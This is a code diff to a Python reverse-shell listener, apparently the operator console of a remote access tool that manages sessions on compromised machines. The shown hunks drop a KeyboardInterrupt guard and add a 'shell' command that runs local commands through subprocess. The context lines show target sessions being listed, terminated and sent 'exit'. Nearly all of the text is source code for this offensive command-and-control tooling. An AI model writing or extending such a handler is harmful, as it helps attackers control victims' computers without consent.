@@ -228,11 +228,8 @@ def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print('listening for connection')
     sock.listen()
-    try:
-        t1 = threading.Thread(target=conn_handler)
-        t1.start()
-    except KeyboardInterrupt:
-        sock.close()
+    t1 = threading.Thread(target=conn_handler)
+    t1.start()
 if __name__=='__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     a = []
@@ -298,6 +295,14 @@ if __name__=='__main__':
                     print(f'Terminated session {num}')
                 except (IndexError,ValueError):
                     print(f"Session {num} not found")
+            if command.split(" ")[0].lower() == "shell":
+                print("Dropping into a local shell. Type 'exit' to return to the reverse shell.\n".encode("utf-8"))
+                while True:
+                    local_command = input("Enter the local command : ")
+                    if local_command.strip() == "exit":
+                        break
+                    result = subprocess.getoutput(local_command)
+                    print(str(result))
             if command == "exit":
                 quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
                 if quit_msg.lower()=='y':
@@ -321,7 +326,7 @@ if __name__=='__main__':
                         pass
                     else:
                         conn_out(target[0], "exit")
-                kill_flag=1
+                kill_flag = 1
                 if listener_count > 0:
                     sock.close()
                 break
